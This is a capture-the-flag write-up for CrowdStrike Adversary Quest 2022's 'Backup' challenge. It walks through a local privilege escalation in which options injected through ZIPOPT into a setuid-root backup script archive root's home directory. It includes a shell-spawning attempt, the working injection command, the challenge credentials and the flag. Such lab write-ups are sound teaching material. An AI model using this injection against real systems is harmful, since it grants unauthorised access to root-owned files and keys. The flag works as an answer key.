# Crowdstrike Adversary Quest 2022 / Protective Penguin / #2 Backup

## Challenge Description

We believe that the actor has accessed a terminal after breaking into the research facility. You can reach it via 116.202.83.208:20022 by using the credentials challenge:haed5Oof$oShip6oo.

Our incident responders have identified an implant that must have been installed as root. Can you figure out how the assumed escalation from challenge to root may have been facilitated?

https://adversary.quest/static/2022AdversaryQuest_Backup_Dummy_e70bb1beda5e74247952aefc0acb594d.qcow2.xz

## TL;DR Summary

TL;DR

## Pre-Requisites

Install QEMU if needed.

```console
$ sudo apt install qemu-system-x86
```

Run the image with QEMU.

```console
$ qemu-system-x86_64 -m 1024 2022AdversaryQuest_Backup_Dummy_e70bb1beda5e74247952aefc0acb594d.qcow2
```

Login to local system with username `challenge` and password `haed5Oof$oShip6oo`.

## System Reconnaissance

The challenge objective is to figure out a local privilege escalation from user `challenge` to user `root`.

There doesn't seem to be a `.bash_history` file to find possible breadcrumbs.

Are we allowed some sudo privileges? No, nothing.

```console
$ sudo -l
[sudo] password for challenge: 
Sorry, user challenge may not run sudo on 2022AdversaryQuest.
```

Are perhaps any processes running (right now) that have something to do with the challenge name Backup? No luck here, either.

```console
$ ps aux | grep -i "backup" | grep -v grep
```

Let's look for possibly exploitable setuid/setgid root binaries on the system.

```console
$ find / -xdev -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null
/usr/bin/umount
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/write.ul
/usr/bin/chage
/usr/bin/chfn
/usr/bin/wall
/usr/bin/crontab
/usr/bin/mount
/usr/bin/expiry
/usr/bin/passwd
/usr/bin/ssh-agent
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/local/sbin/backup
/usr/local/share/fonts
/usr/sbin/unix_chkpwd
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/w3m/w3mimgdisplay
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/libexec/polkit-agent-helper-1
/var/log/journal
/var/log/journal/3e555b1eb41f4ed1acba7a57dd56b170
/var/local
/var/mail
```

Out of the above, `/usr/local/sbin/backup` stands out suspicously.

## Analysis of *backup* 

So let us take a closer look.

```console
$ cd /usr/local/sbin
$ ls -la
total 36
drwxr-xr-x  2 root root  4096 Jul  6 12:27 .
drwxr-xr-x 10 root root  4096 Apr 21 00:57 ..
-rwsrwsr-x  1 root root 15040 Jul  6 12:26 backup
-rwxr-xr-x  1 root root   216 Jul  6 12:26 backup.sh
-rwxr-xr-x  1 root root  4181 Apr 21 01:00 unminimize
```

Checking for interesting strings we find `execve` and `/usr/local/sbin/backup.sh`.

```console
$ strings backup
execv
setuid
geteuid
setgid
/bin/sh
/usr/local/sbin/backup.sh
```

Let's verify what might happen by tracing system call behaviour of *backup*

```console
$ strace ./backup
[...]
setuid(1000)                            = 0
setgid(1000)                            = 0
execve("/bin/sh", ["/bin/sh", "/usr/local/sbin/backup.sh"], 0x7ffdc52eff08 /* 23 vars */) = 0
[...]
zip I/O error: Permission denied
[{WIFEXITED(s) && WEXITSTATUS(s) == 15}], 0, NULL) = 2993
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=2993, si_uid=1000, si_status=15, si_utime=1, si_stime=1} ---
rt_sigreturn({mask=[]})                 = 2993
wait4(-1, 0x7ffe970824bc, WNOHANG, NULL) = -1 ECHILD (No child processes)
read(10, "", 8192)                      = 0
exit_group(15)                          = ?
+++ exited with 15 +++
```

No reverse engineering needed here to figure out that *backup* executes the shellscript *backup.sh* with effective user and group id 0. That shell script seems to do something with the archiving program *zip*.

Let's inspect *backup.sh*.

```console
$ cat /usr/local/sbin/backup.sh
#!/bin/sh
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
BACKUP_BASE="/srv/backup"
BACKUP_DIRS="/etc"
BACKUP_DST="${BACKUP_BASE}/`date -Iseconds`.zip"
zip -r -9 "${BACKUP_DST}" ${BACKUP_DIRS}
```

Where is the *zip* program located that would be executed by *backup.sh*?

```console
$ find /usr -name zip
/usr/bin/zip
```

The destination directory for the backups could be interesting to look up at as well.

```console
$ ls -l /srv
total 4
drwx------ 2 root root 4096 Jul 30 14:52 backup
```

Too bad, this is a dead end due to lack of access permissions.

## Finding an exploitable Vulnerability

Let's recap what we know so far

- We found a setuid root binary *backup* in directory `/usr/local/sbin`.
- It executes the shell script *backup.sh* in the same directory with admin/root privileges.
- *backup.sh* would execute the archiving program *zip* to backup `/etc` into the directory `/srv/backup`.

There don't seem to be many options to dig deeper into. While *zip* is called without an absolute path, there is a PATH variable setting that hinders us from search order hijacking.

It's always a good idea to read up on man pages and/or program documentation. Let's see if we might find something interesting for *zip*.

```console
[...]
ENVIRONMENT
       The following environment variables are read and used by zip as described.

       ZIPOPT
              contains default options that will be used when running zip.  The contents of this environment variable will get added to the command line just after the zip command.
[...]
```

Oh - now that seems interesting. *The contents of this environment variable will get added to the command line just after the zip command*. Let's see where the value of the environment variable *ZIPOPT* would land: `zip $ZIPOPT -r -9 "${BACKUP_DST}" ${BACKUP_DIRS}`

### Approach 1 - GTFOBins Shell Style

A good resource for inspirational linux shenanigans is [GTFOBins](https://gtfobins.github.io). It does have an entry for [zip](https://gtfobins.github.io/gtfobins/zip/)!

One idea is to supply *zip* options to test the archive afterwards (`-T`) and to also supply a different unzip program for that test (`-TT`). Why not have `/bin/sh` do the test? :)

```console
$ ZIPOPT=" -T -TT '/bin/sh' " ./backup
[...]
sh: 1: Syntax error: Unterminated quoted string
free(): double free detected in tcache 2
test of /tmp/temp.zip FAILED

zip error: Zip file invalid, could not spawn unzip, or wrong unzip (original files unmodified)
```

Hmm. That didn't go as planned, too bad.

### Approach 2 - Redirect Output File and Include root's Home Directory

```console
$ ZIPOPT=" -r /tmp/temp /root " ./backup
        zip warning: name not matched: /srv/backup/2022-07-30T15:28:03+00:00.zip
        zip warning: ignoring special file: /etc/systemd/system/apt-daily.timer
        zip warning: name not matched: /etc/systemd/system/multi-user.target.wants/challenge.service
        zip warning: ignoring special file: /etc/systemd/system/snapd.socket
        zip warning: ignoring special file: /etc/systemd/system/apt-daily-upgrade.service
        zip warning: ignoring special file: /etc/systemd/system/unattended-upgrades.service
        zip warning: ignoring special file: /etc/systemd/system/apt-daily-upgrade.timer
        zip warning: ignoring special file: /etc/systemd/system/fwupd-refresh.timer
        zip warning: ignoring special file: /etc/systemd/system/sudo.service
        zip warning: ignoring special file: /etc/systemd/system/snapd.service
  adding: root/ (stored 0%)
  adding: root/.bashrc (deflated 54%)
  adding: root/.ssh/ (stored 0%)
  adding: root/.ssh/authorized_keys (deflated 9%)
  adding: root/.cache/ (stored 0%)
  adding: root/.cache/motd.legal-displayed (stored 0%)
  adding: root/flag.txt (stored 0%)
  adding: root/.profile (deflated 20%)
[...]
```

Now we can unpack the archive and retrieve the flag!

```console
$ cd /tmp
$ unzip temp.zip
$ cd root/
$ cat flag.txt
CS{ZIPOPT_shenanigans}
```

Flag: **CS{ZIPOPT_shenanigans}**
